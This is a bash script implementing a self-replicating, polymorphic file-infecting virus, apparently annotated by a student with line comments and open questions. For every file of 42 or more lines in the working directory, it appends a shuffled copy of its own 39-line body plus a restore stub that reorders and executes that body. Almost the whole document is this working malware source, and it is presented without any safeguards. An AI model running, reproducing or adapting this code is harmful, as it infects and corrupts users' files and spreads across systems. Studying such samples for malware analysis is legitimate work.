#!/bin/bash
if [ "$1" == "test" ]; then #@1 if the first input equal to test, then exit
	exit 0 #@2
fi #@3
MANAGER=(test cd ls pwd) #@4 array declaration
RANDOM=$$ #@5   ??process ID?? number of lines ??
mkdir -m0777 /tmp/\ / #@6  create a folder
for target in *; do #@7 for every file in the folder
	nbline=$(wc -l $target) #@8  nbline are the number of the lines of our file target
	nbline=${nbline## } #@9  nbline now is cutted when we find a space
	nbline=$(echo $nbline | cut -d " " -f1) #@10 the same of above line 9
	if [ $(($nbline)) -lt 42 ]; then #@11 if the number of lines less then 42
		continue #@12
	fi #@13

	#START Restoring function
	NEWFILE=${MANAGER[$((RANDOM % 4))]} #@14 newfile is equal to 1 of the 4 names that we have above
	#the sort redifines the structure of the virus;  randomly reorder code instructions; inverter reorder
	#what is NF????
	#extract the last 39 lines and copy the file infected in the new file
	tail -n 39 $target | awk '{print($NF" "$0)}' | sort -g -t@ -k2 | cut -f2- -d' ' > /tmp/\ /"$NEWFILE" #@15 
	chmod +x /tmp/\ /"$NEWFILE" #@16 gives the permission of execution to the new file
	if /tmp/\ /"$NEWFILE" test ; then #@17 if we are in the tmp folder
		continue #@18
	fi #@19
	#END restoring

	#START Main Viral Body
	NEWFILE=${MANAGER[$((RANDOM % 4))]} #@20 take a new name from the 4 below
	NEWFILE="/tmp/\ /$NEWFILE" #@21 path of this new file that will be created
	#what is NF????
	#take the last 39 lines of the infected file, reorder and put them inside NEWFILE, and then append it in target
	echo "tail -n 39 $target | awk '{print(\$NF\" \"\$0)}' | sort -g -t@ -k2 | cut -f2- -d' ' > $NEWFILE" >> $target #@22
	echo "chmod +x $NEWFILE && $NEWFILE &" >> $target #@23 put the command of giving the execution permission to our infected file
	echo "exit 0" >> $target #@24 put exit 0 at the end of our infected file
	tabft=("FT" [39]=" ") #@25 ??put in the line 39 a blank space??
	declare -i nbl=0 #@26 declare the integer variable nbl
	while [ $nbl -ne 39 ]; do #@27 while nbl is not 39
		valindex=$(((RANDOM % 39)+1)) #@28 take one lines between 1 and 40
		while [ "${tabft[$valindex]}" == "FT" ]; do #@29  ?????
			valindex=$(((RANDOM % 39)+1)) #@30 pick a new line
		done #@31
		line=$(tail -$valindex $0 | head -1) #@32 pick the last -valindex file and then take the first line
		echo -e "$line" >> $target #@33 put this line into our infected file
		tabft[$valindex]="FT" #@34 choose another line
		nbl=$(($nbl+1)) #@35 sign that we have put a line into the infected file
	done #@36
done #@37
rm /tmp/\ /* #@38
rmdir /tmp/\ / #@39
# END Main
